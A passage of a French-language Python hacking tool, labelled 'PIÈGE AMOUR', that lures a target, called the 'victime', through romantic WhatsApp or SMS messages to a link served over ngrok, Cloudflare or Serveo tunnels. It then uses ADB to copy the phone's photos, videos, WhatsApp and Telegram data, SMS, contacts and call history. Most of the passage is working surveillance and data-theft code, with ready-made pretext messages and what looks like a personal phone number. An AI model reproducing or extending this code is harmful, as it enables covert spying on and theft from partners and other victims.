            return 0, 0
        
        print(f"    {C.GREEN}ğŸ“Š {file_count} fichiers trouvÃ©s Ã  tÃ©lÃ©charger{C.END}")
        print(f"\n    {C.MAGENTA}{'â”€'*60}{C.END}")
        print(f"    {C.BOLD}{C.MAGENTA}â¬‡ï¸  TÃ‰LÃ‰CHARGEMENT EN COURS...{C.END}")
        print(f"    {C.MAGENTA}{'â”€'*60}{C.END}\n")
        
        downloaded_count = 0
        downloaded_size = 0
        errors = 0
        
        # TÃ©lÃ©charger fichier par fichier pour voir la progression
        for idx, file_path in enumerate(files_list, 1):
            file_path = file_path.strip()
            if not file_path:
                continue
            
            # Extraire le nom du fichier
            file_name = file_path.split('/')[-1] if '/' in file_path else file_path
            
            # Calculer le chemin de destination relatif
            relative_path = file_path.replace(source_path, '').lstrip('/')
            dest_file = Path(dest_path) / relative_path
            dest_file.parent.mkdir(parents=True, exist_ok=True)
            
            # Obtenir la taille du fichier
            size_cmd = f'"{ADB_PATH}" -s {DEVICE} shell "stat -c%s \\"{file_path}\\" 2>/dev/null"'
            size_result = subprocess.run(size_cmd, shell=True, capture_output=True, text=True, timeout=10)
            try:
                file_size = int(size_result.stdout.strip())
            except:
                file_size = 0
            
            # Barre de progression globale
            percent = (idx / file_count) * 100
            bar_length = 40
            filled = int(bar_length * idx / file_count)
            bar = 'â–ˆ' * filled + 'â–‘' * (bar_length - filled)
            
            # Afficher la progression
            size_str = f"{file_size/1024:.1f}KB" if file_size < 1024*1024 else f"{file_size/(1024*1024):.1f}MB"
            
            print(f"\r    {C.GREEN}[{bar}] {percent:5.1f}%{C.END} ({idx}/{file_count})", end='')
            print(f"\n    {C.CYAN}ğŸ“¥ {file_name[:40]:<40}{C.END} {C.YELLOW}[{size_str}]{C.END}", end='')
            
            # TÃ©lÃ©charger le fichier
            pull_cmd = f'"{ADB_PATH}" -s {DEVICE} pull "{file_path}" "{dest_file}" 2>&1'
            result = subprocess.run(pull_cmd, shell=True, capture_output=True, text=True, timeout=120)
            
            if dest_file.exists():
                actual_size = dest_file.stat().st_size
                downloaded_count += 1
                downloaded_size += actual_size
                print(f" {C.GREEN}âœ“{C.END}", end='')
            else:
                errors += 1
                print(f" {C.RED}âœ—{C.END}", end='')
            
            print()  # Nouvelle ligne
        
        total_files += downloaded_count
        total_size += downloaded_size
        
        # RÃ©sumÃ©
        print(f"\n    {C.CYAN}{'â”€'*60}{C.END}")
        print(f"    {C.BOLD}{C.GREEN}âœ… TÃ‰LÃ‰CHARGEMENT TERMINÃ‰!{C.END}")
        print(f"    {C.CYAN}{'â”€'*60}{C.END}")
        print(f"    {C.WHITE}ğŸ“ Fichiers tÃ©lÃ©chargÃ©s: {C.GREEN}{downloaded_count}/{file_count}{C.END}")
        print(f"    {C.WHITE}ğŸ’¾ Taille totale: {C.GREEN}{downloaded_size/(1024*1024):.2f} MB{C.END}")
        if errors > 0:
            print(f"    {C.RED}âš ï¸  Erreurs: {errors}{C.END}")
        print(f"    {C.CYAN}{'â”€'*60}{C.END}")
        
        return downloaded_count, downloaded_size
    
    print(f"\n{C.MAGENTA}{'â•'*70}{C.END}")
    print(f"{C.BOLD}{C.MAGENTA}ğŸ“¥ DÃ‰BUT DE L'EXTRACTION - 8 CATÃ‰GORIES{C.END}")
    print(f"{C.MAGENTA}{'â•'*70}{C.END}")
    
    # 1. PHOTOS
    photos_dir = extraction_dir / "PHOTOS"
    try:
        f1, s1 = extract_with_progress("/sdcard/DCIM", str(photos_dir / "DCIM"), "ğŸ“¸ PHOTOS DCIM", 1, 8)
        f2, s2 = extract_with_progress("/sdcard/Pictures", str(photos_dir / "Pictures"), "ğŸ“¸ PHOTOS Pictures", 1, 8)
        results['photos'] = f"OK ({f1+f2} fichiers)"
    except Exception as e:
        results['photos'] = str(e)
        print(f"\n    {C.RED}âœ— Erreur photos: {e}{C.END}")
    
    # 2. VIDÃ‰OS
    videos_dir = extraction_dir / "VIDEOS"
    try:
        f1, s1 = extract_with_progress("/sdcard/Movies", str(videos_dir / "Movies"), "ğŸ¬ VIDÃ‰OS Movies", 2, 8)
        f2, s2 = extract_with_progress("/sdcard/DCIM/Camera", str(videos_dir / "Camera"), "ğŸ¬ VIDÃ‰OS Camera", 2, 8)
        results['videos'] = f"OK ({f1+f2} fichiers)"
    except Exception as e:
        results['videos'] = str(e)
        print(f"\n    {C.RED}âœ— Erreur vidÃ©os: {e}{C.END}")
    
    # 3. WHATSAPP
    wa_dir = extraction_dir / "WHATSAPP"
    try:
        f1, s1 = extract_with_progress("/sdcard/WhatsApp", str(wa_dir / "WhatsApp"), "ğŸ’¬ WHATSAPP Data", 3, 8)
        f2, s2 = extract_with_progress("/sdcard/Android/media/com.whatsapp", str(wa_dir / "Media"), "ğŸ’¬ WHATSAPP Media", 3, 8)
        results['whatsapp'] = f"OK ({f1+f2} fichiers)"
    except Exception as e:
        results['whatsapp'] = str(e)
        print(f"\n    {C.RED}âœ— Erreur WhatsApp: {e}{C.END}")
    
    # 4. SMS
    print(f"\n    {C.CYAN}{'â”€'*60}{C.END}")
    print(f"    {C.BOLD}{C.GREEN}[4/8] ğŸ“± SMS{C.END}")
    print(f"    {C.CYAN}{'â”€'*60}{C.END}")
    sms_file = extraction_dir / "sms_messages.txt"
    try:
        print(f"    {C.YELLOW}â³ Extraction des SMS...{C.END}")
        result = subprocess.run(
            f'"{ADB_PATH}" -s {DEVICE} shell content query --uri content://sms',
            shell=True, capture_output=True, text=True, timeout=60
        )
        with open(sms_file, 'w', encoding='utf-8') as f:
            f.write("="*60 + "\n")
            f.write("ğŸ“± SMS EXTRAITS - PIÃˆGE AMOUR\n")
            f.write("="*60 + "\n\n")
            f.write(result.stdout)
        sms_count = result.stdout.count('Row:')
        results['sms'] = f"OK ({sms_count} messages)"
        print(f"    {C.GREEN}âœ… {sms_count} SMS extraits{C.END}")
    except Exception as e:
        results['sms'] = str(e)
        print(f"    {C.RED}âœ— Erreur SMS: {e}{C.END}")
    
    # 5. CONTACTS
    print(f"\n    {C.CYAN}{'â”€'*60}{C.END}")
    print(f"    {C.BOLD}{C.GREEN}[5/8] ğŸ‘¥ CONTACTS{C.END}")
    print(f"    {C.CYAN}{'â”€'*60}{C.END}")
    contacts_file = extraction_dir / "contacts.txt"
    try:
        print(f"    {C.YELLOW}â³ Extraction des contacts...{C.END}")
        result = subprocess.run(
            f'"{ADB_PATH}" -s {DEVICE} shell content query --uri content://contacts/phones',
            shell=True, capture_output=True, text=True, timeout=60
        )
        with open(contacts_file, 'w', encoding='utf-8') as f:
            f.write("="*60 + "\n")
            f.write("ğŸ‘¥ CONTACTS EXTRAITS - PIÃˆGE AMOUR\n")
            f.write("="*60 + "\n\n")
            f.write(result.stdout)
        contacts_count = result.stdout.count('Row:')
        results['contacts'] = f"OK ({contacts_count} contacts)"
        print(f"    {C.GREEN}âœ… {contacts_count} contacts extraits{C.END}")
    except Exception as e:
        results['contacts'] = str(e)
        print(f"    {C.RED}âœ— Erreur contacts: {e}{C.END}")
    
    # 6. HISTORIQUE APPELS
    print(f"\n    {C.CYAN}{'â”€'*60}{C.END}")
    print(f"    {C.BOLD}{C.GREEN}[6/8] ğŸ“ HISTORIQUE APPELS{C.END}")
    print(f"    {C.CYAN}{'â”€'*60}{C.END}")
    calls_file = extraction_dir / "historique_appels.txt"
    try:
        print(f"    {C.YELLOW}â³ Extraction de l'historique...{C.END}")
        result = subprocess.run(
            f'"{ADB_PATH}" -s {DEVICE} shell content query --uri content://call_log/calls',
            shell=True, capture_output=True, text=True, timeout=60
        )
        with open(calls_file, 'w', encoding='utf-8') as f:
            f.write("="*60 + "\n")
            f.write("ğŸ“ HISTORIQUE APPELS - PIÃˆGE AMOUR\n")
            f.write("="*60 + "\n\n")
            f.write(result.stdout)
        calls_count = result.stdout.count('Row:')
        results['calls'] = f"OK ({calls_count} appels)"
        print(f"    {C.GREEN}âœ… {calls_count} appels extraits{C.END}")
    except Exception as e:
        results['calls'] = str(e)
        print(f"    {C.RED}âœ— Erreur appels: {e}{C.END}")
    
    # 7. TELEGRAM
    telegram_dir = extraction_dir / "TELEGRAM"
    try:
        f1, s1 = extract_with_progress("/sdcard/Telegram", str(telegram_dir), "âœˆï¸ TELEGRAM", 7, 8)
        results['telegram'] = f"OK ({f1} fichiers)"
    except Exception as e:
        results['telegram'] = str(e)
        print(f"\n    {C.RED}âœ— Erreur Telegram: {e}{C.END}")
    
    # 8. AUTRES (Screenshots, Downloads, Documents)
    other_dir = extraction_dir / "AUTRES"
    try:
        f1, s1 = extract_with_progress("/sdcard/Screenshots", str(other_dir / "Screenshots"), "ğŸ“² SCREENSHOTS", 8, 8)
        f2, s2 = extract_with_progress("/sdcard/Download", str(other_dir / "Downloads"), "ğŸ“¥ DOWNLOADS", 8, 8)
        f3, s3 = extract_with_progress("/sdcard/Documents", str(other_dir / "Documents"), "ğŸ“„ DOCUMENTS", 8, 8)
        results['autres'] = f"OK ({f1+f2+f3} fichiers)"
    except Exception as e:
        results['autres'] = str(e)
        print(f"\n    {C.RED}âœ— Erreur autres: {e}{C.END}")
    
    # Rapport final avec statistiques
    print(f"\n\n{C.GREEN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}{C.GREEN}ğŸ“Š RAPPORT FINAL DE L'EXTRACTION{C.END}")
    print(f"{C.GREEN}{'â•'*70}{C.END}")
    
    report_file = extraction_dir / "RAPPORT_EXTRACTION.txt"
    with open(report_file, 'w', encoding='utf-8') as f:
        f.write("="*60 + "\n")
        f.write("ğŸ’• RAPPORT EXTRACTION - PIÃˆGE AMOUR\n")
        f.write("="*60 + "\n\n")
        f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Appareil: {DEVICE}\n\n")
        f.write("-"*40 + "\n")
        f.write("RÃ‰SULTATS:\n")
        f.write("-"*40 + "\n")
        for key, value in results.items():
            status = "âœ“" if "OK" in str(value) else "âœ—"
            f.write(f"  {status} {key}: {value}\n")
        f.write(f"\nTOTAL: {total_files} fichiers ({total_size/(1024*1024):.1f} MB)\n")
    
    # Affichage du rapport
    print(f"\n    {C.CYAN}ğŸ“‹ RÃ‰SUMÃ‰:{C.END}")
    for key, value in results.items():
        status_icon = "âœ…" if "OK" in str(value) else "âŒ"
        print(f"    {status_icon} {key.upper()}: {value}")
    
    print(f"\n    {C.YELLOW}{'â”€'*60}{C.END}")
    print(f"    {C.BOLD}{C.MAGENTA}ğŸ“Š STATISTIQUES TOTALES:{C.END}")
    print(f"    {C.WHITE}    ğŸ“ Fichiers extraits: {total_files}{C.END}")
    print(f"    {C.WHITE}    ğŸ’¾ Taille totale: {total_size/(1024*1024):.1f} MB{C.END}")
    print(f"    {C.WHITE}    ğŸ“‚ Dossier: {extraction_dir}{C.END}")
    print(f"    {C.YELLOW}{'â”€'*60}{C.END}")
    
    print(f"\n{C.GREEN}{'â•'*70}{C.END}")
    print(f"{C.BOLD}{C.GREEN}ğŸ’• EXTRACTION PIÃˆGE AMOUR TERMINÃ‰E!{C.END}")
    print(f"{C.GREEN}{'â•'*70}{C.END}")
    print(f"\n    {C.CYAN}ğŸ“ Toutes les donnÃ©es dans:{C.END}")
    print(f"    {C.WHITE}{extraction_dir}{C.END}\n")

def start_love_trap(port=8889):
    """DÃ©marre le serveur piÃ¨ge amour"""
    global LOVE_TRAP_SERVER, LOVE_TRAP_EXTRACTION_DONE
    
    LOVE_TRAP_EXTRACTION_DONE = False
    
    print(f"\n{C.MAGENTA}{'â•'*70}{C.END}")
    print(f"{C.BOLD}{C.MAGENTA}ğŸ’• PIÃˆGE AMOUR - EXTRACTION AUTOMATIQUE{C.END}")
    print(f"{C.MAGENTA}{'â•'*70}{C.END}\n")
    
    local_ip = get_local_ip()
    
    try:
        LOVE_TRAP_SERVER = HTTPServer(('0.0.0.0', port), LoveTrapHandler)
        
        print(f"    {C.GREEN}âœ“ Serveur piÃ¨ge amour dÃ©marrÃ© sur le port {port}{C.END}\n")
        print(f"    {C.YELLOW}ğŸ“ LIEN Ã€ ENVOYER:{C.END}")
        print(f"    {C.CYAN}   http://{local_ip}:{port}{C.END}\n")
        print(f"    {C.MAGENTA}ğŸ’• Quand la victime clique sur 'Ouvrir mon message':{C.END}")
        print(f"    {C.WHITE}   â†’ Toutes ses PHOTOS sont extraites{C.END}")
        print(f"    {C.WHITE}   â†’ Toutes ses VIDÃ‰OS sont extraites{C.END}")
        print(f"    {C.WHITE}   â†’ Tout WHATSAPP est extrait{C.END}")
        print(f"    {C.WHITE}   â†’ Tous les SMS sont extraits{C.END}")
        print(f"    {C.WHITE}   â†’ Tous les CONTACTS sont extraits{C.END}")
        print(f"    {C.WHITE}   â†’ L'historique des APPELS est extrait{C.END}")
        print(f"    {C.WHITE}   â†’ TELEGRAM est extrait{C.END}")
        print(f"    {C.WHITE}   â†’ Et elle voit un beau message d'amour! ğŸ’•{C.END}\n")
        print(f"    {C.RED}â³ En attente que la victime clique...{C.END}\n")
        
        server_thread = threading.Thread(target=LOVE_TRAP_SERVER.serve_forever)
        server_thread.daemon = True
        server_thread.start()
        
        return local_ip, port
        
    except OSError as e:
        print_error(f"Erreur: {e}")
        return None, None

# Ton numÃ©ro WhatsApp pour envoyer les liens
MY_WHATSAPP_NUMBER = "+2250150252467"

# Chemin vers ngrok et cloudflared
NGROK_PATH = r"C:\Users\davis\OneDrive\Bureau\HACKING\Tools\ngrok.exe"
CLOUDFLARED_PATH = r"C:\Users\davis\AppData\Local\Microsoft\WinGet\Packages\Cloudflare.cloudflared_Microsoft.Winget.Source_8wekyb3d8bbwe\cloudflared.exe"

def start_cloudflared(port):
    """DÃ©marre cloudflared tunnel (gratuit, sans page d'avertissement)"""
    global NGROK_PROCESS
    
    print(f"\n    {C.CYAN}ğŸŒ DÃ‰MARRAGE DE CLOUDFLARE TUNNEL (sans page d'avertissement)...{C.END}")
    
    # VÃ©rifier que cloudflared existe
    import os
    if not os.path.exists(CLOUDFLARED_PATH):
        print(f"    {C.RED}âœ— cloudflared.exe non trouvÃ© Ã : {CLOUDFLARED_PATH}{C.END}")
        return None, None
    
    print(f"    {C.GREEN}âœ“ cloudflared trouvÃ©: {CLOUDFLARED_PATH}{C.END}")
    
    try:
        # Tuer les anciens processus
        subprocess.run('taskkill /F /IM cloudflared.exe 2>nul', shell=True, capture_output=True)
        import time
        time.sleep(2)
        
        # Utiliser une mÃ©thode diffÃ©rente pour capturer la sortie cloudflared
        # Cloudflared Ã©crit sur stderr, on doit tout capturer
        import threading
        import queue
        
        tunnel_cmd = [CLOUDFLARED_PATH, "tunnel", "--url", f"http://localhost:{port}"]
        print(f"    {C.YELLOW}Commande: {' '.join(tunnel_cmd)}{C.END}")
        
        # Queue pour rÃ©cupÃ©rer l'URL
        url_queue = queue.Queue()
        
        NGROK_PROCESS = subprocess.Popen(
            tunnel_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1
        )
        
        def read_stderr():
            """Lit stderr en continu et cherche l'URL"""
            import re
            for line in NGROK_PROCESS.stderr:
                print(f"    {C.CYAN}[CF] {line.strip()[:70]}{C.END}")
                # Chercher l'URL trycloudflare
                match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
                if match:
                    url_queue.put(match.group(0))
                    break
        
        # Lancer le thread de lecture
        reader_thread = threading.Thread(target=read_stderr, daemon=True)
        reader_thread.start()
        
        print(f"    {C.YELLOW}â³ CrÃ©ation du tunnel Cloudflare (patientez ~10 secondes)...{C.END}")
        
        # Attendre l'URL avec timeout
        try:
            url = url_queue.get(timeout=15)
            print(f"\n    {C.GREEN}âœ“ TUNNEL CLOUDFLARE CRÃ‰Ã‰ AVEC SUCCÃˆS!{C.END}")
            print(f"    {C.GREEN}ğŸ”— URL DIRECTE (SANS AVERTISSEMENT): {url}{C.END}")
            return url, NGROK_PROCESS
        except queue.Empty:
            print(f"    {C.YELLOW}âš ï¸ URL Cloudflare non dÃ©tectÃ©e (timeout){C.END}")
            return None, NGROK_PROCESS
        
    except Exception as e:
        print(f"    {C.RED}âœ— Erreur Cloudflare: {e}{C.END}")
        return None, None

def start_ngrok(port):
    """DÃ©marre ngrok et retourne l'URL publique"""
    global NGROK_PROCESS
    
    print(f"\n    {C.CYAN}ğŸš€ DÃ‰MARRAGE DE NGROK...{C.END}")
    
    try:
        # Tuer les anciens processus ngrok
        subprocess.run('taskkill /F /IM ngrok.exe 2>nul', shell=True, capture_output=True)
        import time
        time.sleep(1)
        
        # DÃ©marrer ngrok en arriÃ¨re-plan avec le chemin complet
        # Ajouter --host-header pour Ã©viter l'avertissement
        ngrok_cmd = f'"{NGROK_PATH}" http {port} --log=stdout'
        NGROK_PROCESS = subprocess.Popen(
            ngrok_cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        print(f"    {C.YELLOW}â³ Connexion Ã  ngrok...{C.END}")
        time.sleep(4)
        
        # Obtenir l'URL via l'API ngrok
        try:
            import urllib.request
            import json
            req = urllib.request.urlopen('http://127.0.0.1:4040/api/tunnels', timeout=10)
            data = json.loads(req.read().decode())
            
            for tunnel in data.get('tunnels', []):
                public_url = tunnel.get('public_url', '')
                if public_url.startswith('https://'):
                    print(f"    {C.GREEN}âœ“ NGROK CONNECTÃ‰!{C.END}")
                    print(f"    {C.GREEN}ğŸ”— URL PUBLIQUE: {public_url}{C.END}")
                    return public_url, NGROK_PROCESS
                    
        except Exception as e:
            print(f"    {C.YELLOW}API ngrok pas encore prÃªte, nouvelle tentative...{C.END}")
            time.sleep(3)
            try:
                req = urllib.request.urlopen('http://127.0.0.1:4040/api/tunnels', timeout=10)
                data = json.loads(req.read().decode())
                for tunnel in data.get('tunnels', []):
                    public_url = tunnel.get('public_url', '')
                    if public_url.startswith('https://'):
                        print(f"    {C.GREEN}âœ“ NGROK CONNECTÃ‰!{C.END}")
                        print(f"    {C.GREEN}ğŸ”— URL PUBLIQUE: {public_url}{C.END}")
                        return public_url, NGROK_PROCESS
            except:
                pass
        
        # MÃ©thode alternative: lire la sortie
        time.sleep(2)
        
        return None, NGROK_PROCESS
        
    except FileNotFoundError:
        print(f"    {C.RED}âœ— ngrok n'est pas installÃ©!{C.END}")
        print(f"    {C.YELLOW}â†’ Installe avec: winget install ngrok.ngrok{C.END}")
        return None, None
    except Exception as e:
        print(f"    {C.RED}âœ— Erreur ngrok: {e}{C.END}")
        return None, None

def create_public_tunnel(port):
    """CrÃ©e un tunnel public - NGROK en prioritÃ©"""
    print(f"\n    {C.CYAN}ğŸŒ CRÃ‰ATION D'UN LIEN PUBLIC AVEC NGROK...{C.END}")
    
    # MÃ©thode 1: NGROK (prioritaire)
    print(f"    {C.YELLOW}DÃ©marrage de ngrok...{C.END}")
    ngrok_url, ngrok_process = start_ngrok(port)
    if ngrok_url:
        # Ajouter le paramÃ¨tre pour skip la page
        ngrok_url_skip = ngrok_url + "?ngrok-skip-browser-warning=true"
        print(f"    {C.YELLOW}âš ï¸  Utilise ce lien pour Ã©viter la page ngrok:{C.END}")
        print(f"    {C.GREEN}{ngrok_url_skip}{C.END}")
        return ngrok_url_skip, ngrok_process
    
    # MÃ©thode 3: Serveo (gratuit, sans installation)
    try:
        print(f"    {C.YELLOW}Tentative avec Serveo.net...{C.END}")
        serveo_cmd = f'ssh -o StrictHostKeyChecking=no -R 80:localhost:{port} serveo.net'
        process = subprocess.Popen(
            serveo_cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        
        import time
        time.sleep(3)
        
        for line in process.stdout:
            if 'serveo.net' in line:
                url = line.strip()
                if 'https://' in url:
                    print(f"    {C.GREEN}âœ“ Tunnel crÃ©Ã©!{C.END}")
                    return url, process
        
    except Exception as e:
        print(f"    {C.YELLOW}Serveo non disponible: {e}{C.END}")
    
    # Si aucun tunnel ne fonctionne
    tailscale_ip = "100.88.242.60"
    print(f"\n    {C.YELLOW}ğŸ’¡ ALTERNATIVES POUR ACCÃˆS EXTERNE:{C.END}")
    print(f"    {C.WHITE}   1. Utilise Tailscale: http://{tailscale_ip}:{port}{C.END}")
    print(f"    {C.WHITE}   2. Configure le port forwarding sur ton routeur{C.END}")
    
    return None, None

def send_love_trap_whatsapp():
    """Envoie le lien piÃ¨ge amour via WhatsApp depuis TON numÃ©ro"""
    global DEVICE, LOVE_TRAP_SERVER
    
    port = 8889
    local_ip = get_local_ip()
    tailscale_ip = "100.88.242.60"
    
    print(f"\n{C.MAGENTA}{'â•'*70}{C.END}")
    print(f"{C.BOLD}{C.MAGENTA}ğŸ’• PIÃˆGE AMOUR - ENVOI VIA WHATSAPP{C.END}")
    print(f"{C.MAGENTA}{'â•'*70}{C.END}")
    print(f"\n    {C.CYAN}ğŸ“± Ton numÃ©ro WhatsApp: {MY_WHATSAPP_NUMBER}{C.END}\n")
    
    # DÃ©marrer le serveur d'abord
    start_love_trap(port)
    
    # CrÃ©er automatiquement un lien NGROK public
    print(f"\n    {C.YELLOW}ğŸ”— CRÃ‰ATION DU LIEN PUBLIC AVEC NGROK...{C.END}")
    
    public_url, tunnel_process = create_public_tunnel(port)
    
    if public_url:
        link = public_url
        print(f"\n    {C.GREEN}âœ“ LIEN PUBLIC CRÃ‰Ã‰: {link}{C.END}")
    else:
        # Fallback options
        print(f"\n    {C.YELLOW}âš ï¸  Ngrok non disponible, choisis une alternative:{C.END}")
        print(f"    {C.WHITE}1. RÃ©seau local (WiFi): http://{local_ip}:{port}{C.END}")
        print(f"    {C.WHITE}2. Tailscale: http://{tailscale_ip}:{port}{C.END}")
        print(f"    {C.WHITE}3. Entrer un lien personnalisÃ©{C.END}")
        
        alt_choice = input(f"\n    {C.CYAN}Choix [1-3]: {C.END}").strip()
        
        if alt_choice == "1":
            link = f"http://{local_ip}:{port}"
        elif alt_choice == "2":
            link = f"http://{tailscale_ip}:{port}"
        elif alt_choice == "3":
            link = input(f"    {C.CYAN}Entre ton lien: {C.END}").strip()
        else:
            link = f"http://{local_ip}:{port}"
    
    # Messages prÃ©dÃ©finis romantiques
    messages = [
        f"ğŸ’• J'ai un petit mot pour toi bÃ©bÃ©... {link}",
        f"ğŸ’ Mon cÅ“ur, j'ai prÃ©parÃ© quelque chose de spÃ©cial pour toi ğŸ’‹ {link}",
        f"ğŸ’– Surprise mon amour! J'ai quelque chose Ã  te montrer... {link}",
        f"ğŸ’• Tu me manques tellement... J'ai Ã©crit quelque chose pour toi {link}",
        f"ğŸ’˜ Ouvre ce lien mon bÃ©bÃ©, j'ai un cadeau pour toi ğŸ’ {link}",
        f"â¤ï¸ Mon amour, clique ici j'ai une surprise... {link}",
        f"ğŸ’• J'ai pensÃ© Ã  toi toute la journÃ©e... Regarde Ã§a {link}",
        f"ğŸ’– BÃ©bÃ©, j'ai quelque chose d'important Ã  te dire... {link}"
    ]
    
    print(f"\n    {C.YELLOW}ğŸ’¬ MESSAGES PRÃ‰DÃ‰FINIS:{C.END}")
    for i, msg in enumerate(messages, 1):
        preview = msg[:60] + "..." if len(msg) > 60 else msg
        print(f"    {C.WHITE}{i}. {preview}{C.END}")
    print(f"    {C.WHITE}9. Message personnalisÃ©{C.END}")
    
    msg_choice = input(f"\n    {C.CYAN}Choix [1-9]: {C.END}").strip()
    
    if msg_choice == "9":
        custom_msg = input(f"\n    {C.CYAN}Ton message (le lien sera ajoutÃ©): {C.END}")
        message = f"{custom_msg} {link}"
    elif msg_choice.isdigit() and 1 <= int(msg_choice) <= 8:
        message = messages[int(msg_choice) - 1]
    else:
        message = messages[0]
    
    # Demander le numÃ©ro de la CIBLE (destinataire)
    print(f"\n    {C.YELLOW}ğŸ“± NUMÃ‰RO DE LA CIBLE (destinataire):{C.END}")
    target_phone = input(f"    {C.CYAN}NumÃ©ro WhatsApp de la cible (ex: +225xxxxxxxx): {C.END}").strip()
    
    if not target_phone:
        print(f"\n    {C.YELLOW}Aucun numÃ©ro entrÃ©. Voici le lien Ã  envoyer manuellement:{C.END}")
        print(f"\n    {C.CYAN}ğŸ”— {link}{C.END}")
        print(f"\n    {C.WHITE}Message Ã  copier:{C.END}")
        print(f"    {C.GREEN}{message}{C.END}")
    else:
        # Nettoyer le numÃ©ro
        target_phone = target_phone.replace("+", "").replace(" ", "").replace("-", "")
        
        # Encoder le message pour URL
        import urllib.parse
        encoded_message = urllib.parse.quote(message)
        
        # Ouvrir WhatsApp avec le message prÃªt Ã  envoyer depuis TON tÃ©lÃ©phone
        whatsapp_url = f"https://wa.me/{target_phone}?text={encoded_message}"
        
        print(f"\n    {C.GREEN}ğŸ“¤ OUVERTURE DE WHATSAPP SUR TON TÃ‰LÃ‰PHONE...{C.END}")
        print(f"    {C.WHITE}â†’ De: {MY_WHATSAPP_NUMBER} (ton numÃ©ro){C.END}")
        print(f"    {C.WHITE}â†’ Vers: +{target_phone} (la cible){C.END}")
        
        # Ouvrir le lien WhatsApp via ADB sur TON tÃ©lÃ©phone
        cmd = f'am start -a android.intent.action.VIEW -d "{whatsapp_url}"'
        result = adb_shell(cmd)
        
        if result is not None:
            print(f"\n    {C.GREEN}âœ“ WhatsApp ouvert avec le message!{C.END}")
            print(f"    {C.YELLOW}ğŸ“± APPUIE SUR ENVOYER SUR TON TÃ‰LÃ‰PHONE!{C.END}")
        else:
            # MÃ©thode alternative
            escaped_msg = message.replace('"', '\\"').replace("'", "\\'")
            cmd2 = f'am start -a android.intent.action.SEND -t text/plain --es android.intent.extra.TEXT "{escaped_msg}" -p com.whatsapp'
            adb_shell(cmd2)
            print(f"\n    {C.GREEN}âœ“ WhatsApp ouvert!{C.END}")
            print(f"    {C.YELLOW}ğŸ“± SÃ©lectionne le contact et envoie{C.END}")
    
    print(f"\n{C.GREEN}{'â•'*70}{C.END}")
    print(f"    {C.BOLD}{C.GREEN}âœ“ PIÃˆGE AMOUR ACTIF!{C.END}")
    print(f"{C.GREEN}{'â•'*70}{C.END}")
    print(f"\n    {C.YELLOW}ğŸ”— Lien actif: {link}{C.END}")
    print(f"    {C.CYAN}ğŸ“± EnvoyÃ© depuis: {MY_WHATSAPP_NUMBER}{C.END}")
    print(f"    {C.RED}â³ En attente que la cible clique...{C.END}")
    print(f"\n    {C.MAGENTA}Quand elle cliquera:{C.END}")
    print(f"    {C.WHITE}   â†’ Elle verra 'JE T'AIME MA FEMME AU FOYER BISOUS' ğŸ’•{C.END}")
    print(f"    {C.WHITE}   â†’ Toutes ses donnÃ©es seront extraites automatiquement!{C.END}\n")
    
    input(f"    {C.YELLOW}Appuie sur EntrÃ©e quand tu veux arrÃªter...{C.END}")
    
    if LOVE_TRAP_SERVER:
        LOVE_TRAP_SERVER.shutdown()
        print(f"\n    {C.GREEN}âœ“ Serveur arrÃªtÃ©{C.END}")

def send_love_trap_sms():
    """Envoie le lien piÃ¨ge amour par SMS"""
    global DEVICE
    
    local_ip, port = start_love_trap()
    
    if not local_ip:
        return
    
    link = f"http://{local_ip}:{port}"
    
    print(f"\n    {C.YELLOW}ğŸ“± ENVOYER LE LIEN PAR SMS?{C.END}")
    phone = input("    NumÃ©ro de tÃ©lÃ©phone (ou EntrÃ©e pour juste afficher): ").strip()
    
    if phone:
        messages = [
            f"ğŸ’• J'ai un petit mot pour toi bÃ©bÃ©... Clique ici: {link}",
            f"ğŸ’ Mon cÅ“ur, j'ai prÃ©parÃ© quelque chose pour toi: {link}",
            f"ğŸ’– Surprise pour toi mon amour! Ouvre vite: {link}",
            f"ğŸ’• Tu me manques... J'ai quelque chose Ã  te dire: {link}"
        ]
        
        print(f"\n    {C.CYAN}Messages prÃ©dÃ©finis:{C.END}")
        for i, msg in enumerate(messages, 1):
            print(f"        {i}. {msg[:50]}...")
        print(f"        5. Message personnalisÃ©")
        
        msg_choice = input("\n    Choix: ").strip()
        
        if msg_choice == "5":
            message = input("    Ton message (utilise {link} pour le lien): ")
            message = message.replace("{link}", link)
        elif msg_choice in ["1", "2", "3", "4"]:
            message = messages[int(msg_choice) - 1]
        else:
            message = messages[0]
        
        # Envoyer via ADB
        escaped_msg = message.replace('"', '\\"')
        cmd = f'am start -a android.intent.action.SENDTO -d sms:{phone} --es sms_body "{escaped_msg}" --ez exit_on_sent true'
        result = adb_shell(cmd)
        
        print_success(f"SMS prÃ©parÃ© pour {phone}!")
        print_info("Appuie sur ENVOYER sur le tÃ©lÃ©phone pour confirmer")
    
    print(f"\n    {C.RED}ğŸ¯ En attente... Le lien est:{C.END}")
    print(f"    {C.CYAN}{link}{C.END}\n")
    input(f"    {C.YELLOW}Appuie sur EntrÃ©e quand tu veux arrÃªter...{C.END}")
    
    if LOVE_TRAP_SERVER:
        LOVE_TRAP_SERVER.shutdown()

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# MODULE 25: EXTRACTION COMPLÃˆTE
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

def full_extraction():
    """Extraction complÃ¨te de toutes les donnÃ©es"""
    print(f"\n{C.RED}{'â•'*70}{C.END}")
    print(f"{C.BOLD}{C.RED}ğŸ’€ EXTRACTION COMPLÃˆTE - MODE HACKER{C.END}")
    print(f"{C.RED}{'â•'*70}{C.END}\n")
    
    print(f"""
